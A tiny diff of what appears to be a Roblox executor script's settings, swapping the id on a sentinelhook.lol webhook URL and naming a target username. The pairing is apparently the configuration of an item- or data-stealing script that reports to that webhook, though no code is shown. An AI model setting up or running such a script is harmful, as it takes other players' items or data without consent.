@@ -1,4 +1,4 @@
-getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=EqpDNSAsV4fDONu"
+getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=uOz1aJY9MHtUPYp"
 
 getgenv().TARGET_USERNAME = "Hakimidu_95"
 
